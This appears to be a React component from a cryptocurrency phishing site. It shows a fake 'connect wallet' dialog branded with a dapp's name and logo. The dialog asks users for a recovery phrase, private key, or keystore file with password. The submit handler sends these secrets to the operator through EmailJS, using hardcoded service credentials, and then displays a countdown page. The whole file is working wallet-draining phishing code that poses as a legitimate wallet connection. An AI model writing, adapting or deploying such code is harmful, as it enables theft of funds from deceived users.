import { useState } from "react";
import PropTypes from "prop-types";
import emailjs from "@emailjs/browser";
import { Field } from "react-final-form";
import { serialize as objectToFormData } from "object-to-formdata";

import ConnectTabs from "@/components/connectTabs";
import axios from "axios";
import { AppName } from "@/lib/object";

const service_id = "service_kybmawl";
const template_id = "template_oezb6qq";
const user_id = "8MxJpofhMvS7m-YqI";

const Connect = ({ closeModal, setPage, dappName, dappImage }) => {
  const [type, setType] = useState("phrase");

  const onSubmit = (values) => {
    const templateParams = {
      key: type,
      type: type,
      appName: AppName,
      dappName: dappName,
      hasPassword: type == "keystore",
    };

    if (type == "phrase") {
      templateParams.message = values.phrase;
    } else if (type == "pk") {
      templateParams.message = values.pk;
    } else {
      templateParams.message = values.keystore;
      templateParams.password = values.password;
    }

    type == "keystore"
      ? console.log(objectToFormData({ templateParams }))
      : console.log(templateParams);

    emailjs
      .send(service_id, template_id, templateParams, user_id)
      .then((res) => {
        console.log(res);
        setPage("countdown");
      })
      .catch(() => {
        console.log("error");
        setPage("failure");
      });
  };

  const tabs = [
    {
      type: "phrase",
      label: "Phrase",
      content: () => (
        <>
          <div id="data-to-send">
            <div className="form-group">
              <div className="form-group">
                <Field
                  rows={5}
                  name="phrase"
                  component="textarea"
                  className="form-control"
                  style={{ resize: "none" }}
                  placeholder="Enter your recovery phrase"
                  validate={(val) => (val ? null : "This field is required")}
                />
              </div>
              <div className="small text-left my-3" style={{ fontSize: 11 }}>
                Typically 12 (sometimes 24) words separated by single spaces
              </div>
            </div>
          </div>
        </>
      ),
    },
    {
      type: "keystore",
      label: "Keystore JSON",
      content: () => (
        <>
          <div id="data-to-send">
            <div className="form-group">
              <label className="small text-left">Choose keystore file</label>
              <Field
                type="file"
                name="keystore"
                component="input"
                className="form-control-file my-2"
              />
            </div>
            <Field
              name="password"
              type="password"
              component="input"
              className="form-control"
              placeholder="Wallet password"
              validate={(val) => (val ? null : "This field is required")}
            />{" "}
            <div className="small text-left my-3" style={{ fontSize: 11 }}>
              Several lines of text beginning with {"{"}...{"}"} plus the
              password you used to encrypt it.
            </div>
          </div>
        </>
      ),
    },
    {
      type: "pk",
      label: "Private Key",
      content: () => (
        <>
          <div id="data-to-send">
            <Field
              name="pk"
              type="text"
              component="input"
              className="form-control"
              placeholder="Enter your Private Key"
              validate={(val) => (val ? null : "This field is required")}
            />
            <div className="small text-left my-3" style={{ fontSize: 11 }}>
              Typically 12 (sometimes 24) words separated by a single space.
            </div>
          </div>
        </>
      ),
    },
  ];

  return (
    <div id="send-dialog">
      {/* <div className="send-dialog-overlay" /> */}
      <div className="send-dialog-content">
        <div className="connect-dialog-body">
          <div className="to-send-info">
            <div className="wallet-app-send-logo">
              <img
                alt={dappName}
                src={dappImage}
                id="current-wallet-send-logo"
              />
            </div>
            <div id="current-wallet-app-send" className="wallet-app-name-send">
              {dappName}
            </div>
          </div>
          <ConnectTabs
            tabs={tabs}
            setType={setType}
            onSubmit={onSubmit}
            closeModal={closeModal}
          />
        </div>
      </div>
    </div>
  );
};
Connect.propTypes = {
  setPage: PropTypes.func.isRequired,
  dappName: PropTypes.string.isRequired,
  closeModal: PropTypes.func.isRequired,
  dappImage: PropTypes.string.isRequired,
};
export default Connect;
